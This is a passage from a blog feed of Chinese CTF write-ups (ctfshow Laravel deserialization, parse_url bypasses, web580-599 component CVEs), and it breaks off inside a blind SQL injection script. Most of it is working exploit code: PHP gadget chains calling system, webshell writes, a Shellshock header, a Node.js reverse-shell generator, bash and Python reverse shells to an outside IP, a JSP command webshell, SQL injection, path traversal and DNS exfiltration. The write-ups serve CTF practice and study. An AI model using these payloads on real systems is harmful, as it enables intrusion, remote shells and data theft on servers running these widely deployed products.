+<p>但是<code>PendingBroadcast</code>这个类没有了，我们需要找另一个符合要求的类，很难（这里没找到）。<br>
+看下能否利用<code>callClassBasedExtension</code>方法。</p>
+<p>可以看到，我们用上面的<code>DefaultGenerator</code>方法，可以控制<code>$this-&gt;container-&gt;make($class)</code>的值，然后<code>$method</code>我们也可以通过<code>$callback</code>参数控制，<code>$parameters</code>参数也是可控的</p>
+<p>但是因为这里使用的数组形式，所以我们要找可以利用的<code>$this-&gt;container-&gt;make($class)-&gt;$method($parmeters)</code></p>
+<pre><code>    /**
+     * Call a class based validator extension.
+     *
+     * @param  string  $callback
+     * @param  array   $parameters
+     * @return bool
+     */
+    protected function callClassBasedExtension($callback, $parameters)
+    {
+        list($class, $method) = explode('@', $callback);
+
+        return call_user_func_array([$this-&gt;container-&gt;make($class), $method], $parameters);
+    }
+</code></pre>
+<p>这里找到<code>DebugClassLoader</code>的<code>loadClass</code>方法</p>
+<pre><code>public function loadClass($class)
+    {
+        ErrorHandler::stackErrors();
+
+        try {
+            echo &quot;loooooooadclass&quot;;
+            if ($this-&gt;isFinder &amp;&amp; !isset($this-&gt;loaded[$class])) {
+                $this-&gt;loaded[$class] = true;
+                if ($file = $this-&gt;classLoader[0]-&gt;findFile($class)) {
+                    require $file;
+                }
+            } else {
+                echo &quot;sssssssssssucccesss&quot;;
+                call_user_func($this-&gt;classLoader, $class);
+                $file = false;
+            }
+        } catch (\Exception $e) {
+            ErrorHandler::unstackErrors();
+
+            throw $e;
+        } catch (\Throwable $e) {
+            ErrorHandler::unstackErrors();
+
+            throw $e;
+        }
+</code></pre>
+<p>编写exp</p>
+<pre><code class="language-php">&lt;?php
+namespace{
+    use Prophecy\Argument\Token\ObjectStateToken;
+    class Swift_KeyCache_DiskKeyCache{
+        private $_keys=['fallingskies'=&gt;['fallingskies'=&gt;'fallingskies']];
+        private $_path;
+        public function __construct($cmd){
+            $this-&gt;_path=new ObjectStateToken($cmd);
+        }
+    }
+    echo urlencode(base64_encode(serialize(new Swift_KeyCache_DiskKeyCache(&quot;calc&quot;))));
+}
+namespace Prophecy\Argument\Token{
+    use Illuminate\Validation\Validator;
+    class ObjectStateToken{
+        private $name;
+        private $value;
+        private $util;
+        public function __construct($cmd){
+            $this-&gt;name='';
+            $this-&gt;value=$cmd;
+            $this-&gt;util=new Validator();
+        }
+    }
+}
+
+namespace Illuminate\Validation{
+    use Faker\DefaultGenerator;
+    class Validator{
+        protected $container;
+        protected $extensions = [];
+        public function __construct(){
+            $this-&gt;extensions['y']='xxx@loadClass';
+            $this-&gt;container=new DefaultGenerator();
+        }
+    }
+}
+namespace Faker{
+    use Symfony\Component\Debug\DebugClassLoader;
+    class DefaultGenerator
+    {
+        protected $default;
+
+        public function __construct()
+        {
+            $this-&gt;default = new DebugClassLoader();
+        }
+    }
+}
+
+namespace Symfony\Component\Debug{
+    class DebugClassLoader
+    {
+
+        private $classLoader;
+        public function __construct()
+        {
+            $this-&gt;classLoader = &quot;system&quot;;
+        }
+    }
+}
+?&gt;
+</code></pre>
+<h2 id="参考文章">参考文章</h2>
+<p>https://www.anquanke.com/post/id/258264#h3-11</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[ctfshow]Laravel专题]]></title>
+        <id>https://fallingskies22.github.io/post/ctfshowlaravel-zhuan-ti/</id>
+        <link href="https://fallingskies22.github.io/post/ctfshowlaravel-zhuan-ti/">
+        </link>
+        <updated>2024-08-18T09:00:42.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="web627">web627</h2>
+<p>Laravel 5.1 反序列化链<br>
+详细分析参考下篇文章。</p>
+<p><code>Swift_KeyCache_DiskKeyCache</code>-&gt;<code>DefinedTargetClass</code>-&gt;<code>ValidGenerator</code><br>
+exp</p>
+<pre><code class="language-php">&lt;?php
+namespace{
+    use Mockery\Generator\DefinedTargetClass;
+    class Swift_KeyCache_DiskKeyCache{
+        private $_keys=['fallingskies'=&gt;array('fallingskies'=&gt;'fallingskies')];
+        private $_path;
+        public function __construct($cmd){
+            $this-&gt;_path=new DefinedTargetClass($cmd);
+        }
+    }
+    echo urlencode((serialize(new Swift_KeyCache_DiskKeyCache(&quot;whoami&quot;))));
+}
+namespace Mockery\Generator{
+    use Faker\ValidGenerator;
+    class DefinedTargetClass
+    {
+        private $rfc;
+        public function __construct($cmd)
+        {
+            $this-&gt;rfc=new ValidGenerator($cmd);
+        }
+    }
+}
+namespace Faker{
+    class DefaultGenerator{
+        protected $default;
+        public function __construct($cmd)
+        {
+            $this-&gt;default = $cmd;
+        }
+    }
+    class ValidGenerator
+    {
+        protected $generator;
+        protected $validator;
+        protected $maxRetries;
+        public function __construct($cmd){
+            $this-&gt;generator=new DefaultGenerator($cmd);
+            $this-&gt;maxRetries=9;
+            $this-&gt;validator='system';
+        }
+    }
+}
+?&gt;
+</code></pre>
+<p>发送payload时，还需要传一个_token参数。<br>
+以及添加一下Content-type头</p>
+<pre><code>POST /admin HTTP/1.1
+Content-type: application/x-www-form-urlencoded
+
+
+ctfshow=&amp;_token=LiNQc6R2aiDl95vWsN0ko4SoI96UJ7YRDygskvCL
+</code></pre>
+<h2 id="web628">web628</h2>
+<p>u1s1，这个拦截为啥不写出来，找半天发现竟然写在函数里面的，无语😒</p>
+<pre><code class="language-php">&lt;?php
+class DefinedTargetClass
+{
+    private $rfc;
+
+    public function __construct(\ReflectionClass $rfc)
+    {
+        die(&quot;此链不通&quot;);
+</code></pre>
+<p>DefinedTargetClass这个函数被禁了，ValidGenerator函数也被禁了。<br>
+需要找一下新的<code>__tostring</code>和<code>__call</code>,详细分析参考下篇文章。</p>
+<p><code>Swift_KeyCache_DiskKeyCache</code>-&gt;<code>Deprecated</code>-&gt;<code>DatabaseManager</code></p>
+<pre><code class="language-php">&lt;?php
+namespace Illuminate\Database{
+    class DatabaseManager{
+        protected $app;
+        protected $extensions ;
+        public function __construct($payload)
+        {
+            $this-&gt;app['config']['database.default'] = $payload;
+            $this-&gt;app['config']['database.connections'] = [$payload =&gt; 'system'];
+            $this-&gt;extensions[$payload]='call_user_func';
+        }
+    }
+}
+
+namespace phpDocumentor\Reflection\DocBlock\Tags{
+    use Illuminate\Database\DatabaseManager;
+    class Deprecated
+    {
+        protected $description;
+        public function __construct($payload)
+        {
+            $this-&gt;description=new DatabaseManager($payload);
+        }
+    }
+}
+
+namespace {
+    use phpDocumentor\Reflection\DocBlock\Tags\Deprecated;
+    class Swift_KeyCache_DiskKeyCache {
+        private $_path;
+        private $_keys = ['fallingskies' =&gt; ['fallingskies' =&gt; 'fallingskies']];
+        public function __construct($payload) {
+            $this-&gt;_path = new Deprecated($payload);
+        }
+    }
+    echo urlencode(serialize(new Swift_KeyCache_DiskKeyCache(&quot;echo 'PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg=='|base64 -d &gt; 1.php&quot;)));
+}
+?&gt;
+</code></pre>
+<h2 id="web629">web629</h2>
+<p>绕过，换另一条链<br>
+详细分析参考下篇文章。<br>
+<code>Swift_KeyCache_DiskKeyCache</code>-&gt;<code>ObjectStateToken</code>-&gt;<code>Validator</code>-&gt;<code>DebugClassLoader</code></p>
+<pre><code class="language-php">&lt;?php
+namespace{
+    use Prophecy\Argument\Token\ObjectStateToken;
+    class Swift_KeyCache_DiskKeyCache{
+        private $_keys=['fallingskies'=&gt;['fallingskies'=&gt;'fallingskies']];
+        private $_path;
+        public function __construct($cmd){
+            $this-&gt;_path=new ObjectStateToken($cmd);
+        }
+    }
+    echo urlencode(serialize(new Swift_KeyCache_DiskKeyCache(&quot;cat /flags_c&quot;)));
+}
+namespace Prophecy\Argument\Token{
+    use Illuminate\Validation\Validator;
+    class ObjectStateToken{
+        private $name;
+        private $value;
+        private $util;
+        public function __construct($cmd){
+            $this-&gt;name='';
+            $this-&gt;value=$cmd;
+            $this-&gt;util=new Validator();
+        }
+    }
+}
+
+namespace Illuminate\Validation{
+    use Faker\DefaultGenerator;
+    class Validator{
+        protected $container;
+        protected $extensions = [];
+        public function __construct(){
+            $this-&gt;extensions['y']='xxx@loadClass';
+            $this-&gt;container=new DefaultGenerator();
+        }
+    }
+}
+namespace Faker{
+    use Symfony\Component\Debug\DebugClassLoader;
+    class DefaultGenerator
+    {
+        protected $default;
+
+        public function __construct()
+        {
+            $this-&gt;default = new DebugClassLoader();
+        }
+    }
+}
+
+namespace Symfony\Component\Debug{
+    class DebugClassLoader
+    {
+
+        private $classLoader;
+        public function __construct()
+        {
+            $this-&gt;classLoader = &quot;system&quot;;
+        }
+    }
+}
+?&gt;
+</code></pre>
+<h2 id="web630">web630</h2>
+<p>上题exp依然可以</p>
+<h2 id="web631">web631</h2>
+<p>Laravel7.30 反序列化<br>
+使用phpgc中的RCE8就可以</p>
+<h2 id="web632">web632</h2>
+<p>同上</p>
+<h2 id="web633">web633</h2>
+<p>被过滤了,换条链<br>
+下面这些试了都被过滤了。</p>
+<pre><code>RCE2
+
+PendingBroadcast
+	Dispatcher
+
+
+RCE8
+
+FileCookieJar
+	RequiredIf
+		LazyOption
+
+RCE3
+
+PendingBroadcast
+	ChannelManager
+
+RCE4
+
+PendingBroadcast
+	Validator
+</code></pre>
+<p>这个没过滤，但是命令执行没结果</p>
+<pre><code>RCE10
+
+RequiredIf
+	RequestGuard
+</code></pre>
+<p>应该是过滤了<code>PendingBroadcast</code>和<code>FileCookieJar</code></p>
+<p>使用phpgc中的RCE16可以</p>
+<pre><code>RCE16
+
+RotatingFileHandler
+	RequiredIf
+		RequestGuard
+</code></pre>
+<h2 id="web634">web634</h2>
+<p>同上</p>
+<h2 id="web635">web635</h2>
+<p>同上</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[PARSE_URL绕过挑战]]></title>
+        <id>https://fallingskies22.github.io/post/parse_url-rao-guo/</id>
+        <link href="https://fallingskies22.github.io/post/parse_url-rao-guo/">
+        </link>
+        <updated>2024-08-17T03:34:56.000Z</updated>
+        <content type="html"><![CDATA[<p><a href="https://php.golaravel.com/function.parse-url.html">parse_url函数介绍</a><br>
+<a href="https://github.com/php/php-src/blob/8db3d36f2fc7bc440d3a0697a2ce04dca5e73ad1/ext/standard/url.c">源码</a></p>
+<h2 id="challenge1">challenge1</h2>
+<pre><code class="language-php">&lt;?php
+
+$data = parse_url($_GET['u']);
+
+eval($data['host']);
+</code></pre>
+<pre><code>?u=//eval($_GET[1]);/ff&amp;1=system(%27cat%20/flag_is_here.txt%27);
+</code></pre>
+<h2 id="challenge2">challenge2</h2>
+<pre><code class="language-php">&lt;?php
+
+$data = parse_url($_GET['u']);
+
+include $data['host'].$data['path'];
+</code></pre>
+<pre><code>POST /?u=//php:://input HTTP/1.1
+
+data:/text/plain,&lt;?php system('cat /_f1ag_1s_h3re.txt');?&gt;
+</code></pre>
+<h2 id="challenge3">challenge3</h2>
+<pre><code class="language-php">&lt;?php
+
+$data = parse_url($_GET['u']);
+
+include $data['scheme'].$data['path'];
+</code></pre>
+<pre><code>POST /?u=php:://input HTTP/1.1
+
+data:/text/plain,&lt;?php system('cat /_f1a_g_1s_h3re');?&gt;
+</code></pre>
+<p>附带一篇<a href="https://www.cnblogs.com/hf99/p/9637354.html">parse_url源码解析</a>的文章</p>
+<h2 id="challenge4">challenge4</h2>
+<pre><code class="language-php">&lt;?php
+
+$data = parse_url($_GET['u']);
+
+system($data['host']);
+</code></pre>
+<p>host参数里不能有<code>/</code>，需要用其他方法绕过，参考<a href="https://xz.aliyun.com/t/13829">命令注入限制绕过思路刨析</a></p>
+<p>使用<code>${HOME:0:1}</code>来构造<code>/</code></p>
+<pre><code>?u=//cat%20${HOME:0:1}1_f1ag_1s_h3re:1
+</code></pre>
+<h2 id="challenge5">challenge5</h2>
+<pre><code class="language-php">&lt;?php
+
+extract(parse_url($_GET['u']));
+include $$$$$$host;
+</code></pre>
+<p>extract会覆盖变量，然后我们多设置一些变量，让它经过五次跳转到我们控制的内容。</p>
+<pre><code>user://pass:query@scheme/1.html/?fragment#php://input&quot;
+</code></pre>
+<p>parse_url解析结果</p>
+<pre><code>Array
+(
+    [scheme] =&gt; user
+    [host] =&gt; scheme
+    [user] =&gt; pass
+    [pass] =&gt; query
+    [path] =&gt; /1.html/
+    [query] =&gt; fragment
+    [fragment] =&gt; php://input
+)
+</code></pre>
+<p>payload</p>
+<pre><code>POST /?u=user://pass:query@scheme/1.html/?fragment%23php://input HTTP/1.1
+
+&lt;?php system('cat /_f1ag_1s_h3ree');?&gt;
+</code></pre>
+<h2 id="challenge6">challenge6</h2>
+<pre><code class="language-php">&lt;?php
+
+$data = parse_url($_GET['u']);
+
+file_put_contents($data['path'], $data['host']);
+</code></pre>
+<p>host里不能有<code>?</code>，所以不能写入一般的php代码</p>
+<p>使用<code>&lt;script language='php'&gt;</code>格式来绕过。</p>
+<pre><code>//&lt;script%20language=%27php%27&gt;eval($_GET[1]);/var/www/html/2.php
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[ctfshow]组件漏洞]]></title>
+        <id>https://fallingskies22.github.io/post/ctfshowzu-jian-lou-dong/</id>
+        <link href="https://fallingskies22.github.io/post/ctfshowzu-jian-lou-dong/">
+        </link>
+        <updated>2024-08-14T10:14:16.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="web580">web580</h2>
+<p>根据提示发现<a href="https://www.cnblogs.com/Cl0ud/p/14248937.html">Bash Shellshock 破壳漏洞（CVE-2014-6271）</a></p>
+<p>payload</p>
+<pre><code>User-Agent:() { :; }; echo; /bin/cat /flag
+</code></pre>
+<h2 id="web581">web581</h2>
+<p>参考文章<br>
+<a href="https://paper.seebug.org/334">CVE-2017-6920:Drupal远程代码执行漏洞分析及POC构造</a></p>
+<p>构造反序列化payload</p>
+<pre><code class="language-php">&lt;?php
+
+class log{
+    public $filename;
+    public $content;
+    public function __construct($n,$c){
+        $this-&gt;filename=$n;
+        $this-&gt;content=$c;
+    }
+    public function __destruct(){
+        file_put_contents($this-&gt;filename, $this-&gt;content);
+    }
+}
+
+echo(serialize(new log(&quot;/var/www/html/1.php&quot;,&quot;&lt;?php @eval(\$_POST[1])?&gt;&quot;)));
+</code></pre>
+<p>payload</p>
+<pre><code>content=!php/object O:3:&quot;log&quot;:2:{s:8:&quot;filename&quot;;s:19:&quot;/var/www/html/1.php&quot;;s:7:&quot;content&quot;;s:24:&quot;&lt;?php @eval($_POST[1])?&gt;&quot;;}
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://fallingskies22.github.io/post-images/1723632473882.png" alt="" loading="lazy"></figure>
+<h2 id="web582">web582</h2>
+<p>参考文章<a href="http://www.mi1k7ea.com/2020/03/29/node-serialize%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">node-serialize反序列化漏洞</a></p>
+<p>poc</p>
+<pre><code class="language-js">var y = {
+	poc : function(){
+		require('child_process').exec('env', function(error, stdout, stderr){ console.log(stdout) });
+	}
+}
+var s = require('node-serialize');
+console.log(&quot;Serialized:\n&quot; + s.serialize(y));
+</code></pre>
+<p>nodejs执行命令没有回显</p>
+<p>使用nodejsshell.py(需要python2环境)</p>
+<pre><code class="language-python">import sys
+
+if len(sys.argv) != 3:
+    print &quot;Usage: %s &lt;LHOST&gt; &lt;LPORT&gt;&quot; % (sys.argv[0])
+    sys.exit(0)
+
+IP_ADDR = sys.argv[1]
+PORT = sys.argv[2]
+
+
+def charencode(string):
+    &quot;&quot;&quot;String.CharCode&quot;&quot;&quot;
+    encoded = ''
+    for char in string:
+        encoded = encoded + &quot;,&quot; + str(ord(char))
+    return encoded[1:]
+
+print &quot;[+] LHOST = %s&quot; % (IP_ADDR)
+print &quot;[+] LPORT = %s&quot; % (PORT)
+NODEJS_REV_SHELL = '''
+var net = require('net');
+var spawn = require('child_process').spawn;
+HOST=&quot;%s&quot;;
+PORT=&quot;%s&quot;;
+TIMEOUT=&quot;5000&quot;;
+if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }
+function c(HOST,PORT) {
+    var client = new net.Socket();
+    client.connect(PORT, HOST, function() {
+        var sh = spawn('/bin/sh',[]);
+        client.write(&quot;Connected!\\n&quot;);
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+        sh.on('exit',function(code,signal){
+          client.end(&quot;Disconnected!\\n&quot;);
+        });
+    });
+    client.on('error', function(e) {
+        setTimeout(c(HOST,PORT), TIMEOUT);
+    });
+}
+c(HOST,PORT);
+''' % (IP_ADDR, PORT)
+
+
+
+print &quot;[+] Encoding&quot;
+PAYLOAD = charencode(NODEJS_REV_SHELL)
+print &quot;eval(String.fromCharCode(%s))&quot; % (PAYLOAD)
+</code></pre>
+<p>将脚本生成payload加入下方<code>payload</code>处，需要在username参数最后手动添加括号</p>
+<pre><code>{&quot;username&quot;:&quot;_$$ND_FUNC$$_function(){payload}()&quot;,&quot;password&quot;:&quot;123&quot;}
+</code></pre>
+<p>base64编码后，发送<br>
+<img src="https://fallingskies22.github.io/post-images/1723655653934.png" alt="" loading="lazy"></p>
+<p>vps收到反弹shell，执行命令即可。</p>
+<h2 id="web583">web583</h2>
+<p>参考文章<a href="https://blog.chaitin.cn/phpmailer-cve-2016-10033/">PHPMailer 命令执行漏洞（CVE-2016-10033）分析</a></p>
+<p>主要是绕过对email正则的校验，然后利用空格注入sendmail的其他参数命令。</p>
+<p>payload</p>
+<pre><code>name=&lt;?php%20system('cat%20/flag_is_here');?&gt;&amp;email=&quot;aaa&quot;.%20-OQueueDirectory=/tmp/.%20-X/var/www/html/a.php%20@aaa.com&amp;message=qaz
+</code></pre>
+<h2 id="web584">web584</h2>
+<p>参考文章<a href="https://tech.meituan.com/2017/09/29/spring-data-rest-cve.html">Spring Data REST 远程代码执行漏洞（CVE-2017-8046）分析与复现</a></p>
+<p>使用post方法创建一个用户<br>
+<img src="https://fallingskies22.github.io/post-images/1723690551582.png" alt="" loading="lazy"></p>
+<p>使用patch方法修改内容，需要将Content-Type指定为application/json-patch+json<br>
+在path参数处注入SpEL表达式。</p>
+<p>反弹shell命令</p>
+<pre><code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1
+</code></pre>
+<p>使用脚本编码为bytecode</p>
+<pre><code>payload = b'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9pcC9wb3J0IDA+JjE=}|{base64,-d}|{bash,-i}'
+bytecode = ','.join(str(i) for i in list(payload))
+print(bytecode)
+</code></pre>
+<p>payload</p>
+<pre><code>[{ &quot;op&quot;: &quot;replace&quot;, &quot;path&quot;: &quot;T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{98,97,115,104,32,45,99,32,123,101,99,104,111,44,89,109,70,122,97,67,65,116,97,83,65,43,74,105,65,118,90,71,86,50,76,51,82,106,99,67,57,112,99,67,57,119,98,51,74,48,73,68,65,43,74,106,69,61,125,124,123,98,97,115,101,54,52,44,45,100,125,124,123,98,97,115,104,44,45,105,125}))/lastname&quot;, &quot;value&quot;: &quot;ctfshow&quot; }]
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://fallingskies22.github.io/post-images/1723691633100.png" alt="" loading="lazy"></figure>
+<h2 id="web585">web585</h2>
+<p>参考文章Tomcat PUT方法任意写文件漏洞<a href="https://github.com/breaktoprotect/CVE-2017-12615">POC CVE-2017-12615</a></p>
+<p>传一个小马</p>
+<pre><code class="language-java">&lt;%
+    if(&quot;1&quot;.equals(request.getParameter(&quot;pwd&quot;))){
+        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;p&quot;)).getInputStream();
+        int a = -1;
+        byte[] b = new byte[2048];
+        out.print(&quot;&lt;pre&gt;&quot;);
+        while((a=in.read(b))!=-1){
+            out.print(new String(b));
+        }
+        out.print(&quot;&lt;/pre&gt;&quot;);
+    }
+%&gt;
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://fallingskies22.github.io/post-images/1723694547014.png" alt="" loading="lazy"></figure>
+<h2 id="web586">web586</h2>
+<p>参考<a href="https://www.exploit-db.com/exploits/39896">WordPress Plugin Double Opt-In for Download 2.0.9 - SQL Injection</a></p>
+<p>需要注册账号并登录。<br>
+使用<code>load_file</code>读取<code>/flag_is_here</code></p>
+<pre><code>/wp-admin/admin-ajax.php?action=populate_download_edit_form
+
+
+id=0 UNION SELECT 1, 2, 4, 5, 6, 7, load_file(0x2f666c61675f69735f68657265)
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://fallingskies22.github.io/post-images/1723716966943.png" alt="" loading="lazy"></figure>
+<h2 id="web587">web587</h2>
+<p>参考文章[weblogic 远程代码执行 <a href="https://blog.csdn.net/YouthBelief/article/details/121119954">CVE-2019-2725</a></p>
+<p>访问控制台页面<code>/console/login/LoginForm.jsp</code><br>
+发现版本为<code>10.3.6.0</code></p>
+<p>使用<a href="https://github.com/KimJun1010/WeblogicTool">工具</a>扫到存在<a href="https://www.cnblogs.com/backlion/p/8194324.html">CVE-2017-10271</a></p>
+<h2 id="web588">web588</h2>
+<p>weblogic版本为<code>12.2.1.3.0</code></p>
+<p>参考文章<a href="https://www.freebuf.com/vuls/325607.html">CVE-2018-2894漏洞复现</a></p>
+<p>利用上题工具执行<code>env</code></p>
+<h2 id="web589">web589</h2>
+<p>参考文章<a href="https://blog.csdn.net/m0_51683653/article/details/129240528">CVE-2016-3088 ActiveMQ任意文件写入漏洞</a><br>
+访问<code>/admin</code>路径<br>
+默认账户密码admin/admin 登录</p>
+<p>访问<code>/admin/test/systemProperties.jsp</code>获得web目录的绝对路径</p>
+<p>使用PUT方法上传小马<br>
+<img src="https://fallingskies22.github.io/post-images/1723722142544.png" alt="" loading="lazy"></p>
+<p>使用MOVE方法移动到web目录下<br>
+<img src="https://fallingskies22.github.io/post-images/1723722278587.png" alt="" loading="lazy"></p>
+<p>访问webshell</p>
+<pre><code>admin/1.jsp?pwd=1&amp;p=env
+</code></pre>
+<h2 id="web590">web590</h2>
+<p>参考文章<a href="https://github.com/vulhub/vulhub/blob/master/apereo-cas/4.1-rce/README.zh-cn.md">Apereo CAS 4.1 反序列化命令执行漏洞</a></p>
+<p>使用工具<a href="https://github.com/vulhub/Apereo-CAS-Attack">Apereo-CAS attack</a>生成payload</p>
+<p>使用反弹shell的方式</p>
+<pre><code>java -jar .\apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 &quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9pcC9wb3J0IDA+JjE=}|{base64,-d}|{bash,-i}&quot;
+</code></pre>
+<p>将payload放在登录包中的execution参数中<br>
+<img src="https://fallingskies22.github.io/post-images/1723733265732.png" alt="" loading="lazy"></p>
+<h2 id="web591">web591</h2>
+<p>参考文章<a href="https://www.freebuf.com/vuls/270633.html">Apache HTTPD 换行解析漏洞分析与复现（CVE-2017-15715）</a></p>
+<p>文件上传处对文件名做了校验，使用%0a的方式绕过，详细分析看上面文章，不要直接换行，会变成<code>0x0d0x0a</code>，使用hex修改的方式在文件名最后添加<code>0x0a</code><br>
+<img src="https://fallingskies22.github.io/post-images/1723733981686.png" alt="" loading="lazy"></p>
+<h2 id="web592">web592</h2>
+<p>参考文章<a href="https://github.com/vulhub/vulhub/blob/master/httpd/apache_parsing_vulnerability/README.md">Apache HTTPD 多后缀解析漏洞</a></p>
+<p>上传文件名为<code>1.php.png</code><br>
+只要给.php后缀增加了处理器，在多个后缀情况下，只要含有<code>.php</code>后缀的文件即将被识别成PHP文件</p>
+<figure data-type="image" tabindex="5"><img src="https://fallingskies22.github.io/post-images/1723734648233.png" alt="" loading="lazy"></figure>
+<h2 id="web593">web593</h2>
+<p>参考文章<a href="https://zgao.top/apache-ssi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">Apache SSI 远程命令执行漏洞复现</a></p>
+<p>上传shtml文件</p>
+<pre><code>&lt;!--#exec cmd=&quot;cat /flag&quot;--&gt;
+</code></pre>
+<p>访问即可执行命令。</p>
+<h2 id="web594">web594</h2>
+<p>参考文章<a href="https://www.anquanke.com/post/id/231459">CVE-2021-3129 Laravel Debug mode RCE 漏洞分析</a></p>
+<p>这个漏洞的利用过程还是挺精彩的，主要是利用伪协议清除无关数据干扰，写入phar文件的过程。</p>
+<p>生成反序列化payload的<a href="https://github.com/ambionics/phpggc">工具phpggc</a></p>
+<p>这里利用 Monolog 库的链，也可以用Laravel自带的链。</p>
+<p>使用其他人写好的<a href="https://github.com/zhzyker/CVE-2021-3129/tree/main">exp</a>,有问题可以自己修改下。😘</p>
+<h2 id="web595">web595</h2>
+<p>参考文章<a href="https://www.bilibili.com/read/cv10712219/">PHP zerodium后门漏洞</a></p>
+<pre><code>User-Agentt: zerodiumsystem('cat /flag');
+</code></pre>
+<h2 id="web596">web596</h2>
+<p>参考文章<a href="https://github.com/neargle/PIL-RCE-By-GhostButt">PIL-RCE-By-GhostButt</a></p>
+<p>这个漏洞还是很复杂，等有需要再慢慢分析。</p>
+<p>上传图片1.png，参考<a href="https://github.com/vulhub/vulhub/blob/master/python/PIL-CVE-2017-8291/poc.png">poc.png</a></p>
+<p><img src="https://fallingskies22.github.io/post-images/1723955493983.png" alt="" loading="lazy"><br>
+将payload处改为反弹shell</p>
+<pre><code class="language-sh">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;47.109.140.38&quot;,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)'
+</code></pre>
+<h2 id="web597">web597</h2>
+<p>参考文章<a href="https://github.com/vulhub/vulhub/blob/master/rails/CVE-2018-3760/README.zh-cn.md">Ruby On Rails 路径穿越漏洞（CVE-2018-3760）</a></p>
+<p>访问链接<code>/assets/file:%2f%2f/etc/passwd</code>获取允许的目录列表</p>
+<p>再使用<code>%252e%252e</code>向上一层跳转读取其他文件。</p>
+<pre><code>/assets/file:%2f%2f/usr/src/blog/app/assets/images/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/flag
+</code></pre>
+<h2 id="web598">web598</h2>
+<p>参考文章<a href="https://github.com/cyberharsh/rails5418">Ruby on Rails 路径穿越与任意文件读取漏洞（CVE-2019-5418）</a></p>
+<pre><code>Accept: ../../../../../../../../flag{{
+</code></pre>
+<h2 id="web599">web599</h2>
+<p>参考文章<a href="https://github.com/Threekiii/Vulhub-Reproduce/blob/master/Ruby%20NetFTP%20%E6%A8%A1%E5%9D%97%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2017-17405.md">Ruby NetFTP 模块命令注入漏洞 CVE-2017-17405</a></p>
+<p>自己起一个ftp服务</p>
+<pre><code># 安装pyftpdlib
+pip install pyftpdlib
+
+# 在当前目录下启动一个ftp服务器，默认监听在`0.0.0.0:8080`端口
+python3 -m pyftpdlib -p 8080 -i 0.0.0.0
+</code></pre>
+<p>参考payload如下</p>
+<pre><code>GET /download?uri=ftp://ip:port/&amp;file=|ping${IFS}$FLAG.4d62192e-9edb-4352-9024-cb01ee487a23.dnshook.site${IFS}-c${IFS}5 HTTP/1.1
+</code></pre>
+<p>执行不了命令，不知道为啥。。。</p>
+<p>一开始以为是vps防火墙问题，全端口开放后依然无法顺利执行命令。。。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[ctfshow]中期测评]]></title>
+        <id>https://fallingskies22.github.io/post/ctfshowzhong-qi-ce-ping/</id>
+        <link href="https://fallingskies22.github.io/post/ctfshowzhong-qi-ce-ping/">
+        </link>
+        <updated>2024-08-06T12:24:46.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="web486">web486</h2>
+<p>根据报错信息提示，发现需要提供action参数，然后<code>file_get_contents($_GET['action'].php)</code></p>
+<pre><code>?action=../flag
+</code></pre>
+<h2 id="web487">web487</h2>
+<p>利用上题任意文件读取看index.php源码</p>
+<pre><code class="language-php">&lt;?php
+include('render/render_class.php');
+include('render/db_class.php');
+$action=$_GET['action'];
+if(!isset($action)){
+	header('location:index.php?action=login');
+	die();	
+}
+
+if($action=='check'){
+	$username=$_GET['username'];
+	$password=$_GET['password'];
+	$sql = &quot;select id from user where username = md5('$username') and password=md5('$password') order by id limit 1&quot;;
+	$user=db::select_one($sql);
+	if($user){
+		templateUtil::render('index',array('username'=&gt;$username));
+	}else{
+		header('location:index.php?action=login');
+	}
+}
+
+if($action=='login'){
+	templateUtil::render($action);
+}else{
+	templateUtil::render($action);
+}
+</code></pre>
+<p>这里存在sql注入，然后username处应该是有回显的，但可能题目有问题，回显不了。<br>
+使用盲注脚本</p>
+<pre><code class="language-py">import requests
+
+url = &quot;http://df52edca-7258-4e0a-8b02-6943d7e6edd7.challenge.ctf.show/index.php?action=check&quot;
+
+result = ''
+i = 0
+
+proxy = {
+    'http':&quot;http://127.0.0.1:8080&quot;
+}
+
+while True:
+    i = i + 1
+    head = 32
+    tail = 127
+
+    while head &lt; tail:
+        mid = (head + tail) &gt;&gt; 1
+        # payload = f'if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&quot;ctfshow&quot;)),{i},1))&gt;{mid},1,0)'
+        # payload = f'if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_schema=&quot;ctfshow&quot;)),{i},1))&gt;{mid},1,0)'
+        payload = f'if(ascii(substr((select(group_concat(flag))from(ctfshow.flag)),{i},1))&gt;{mid},1,0)'
+        data = {
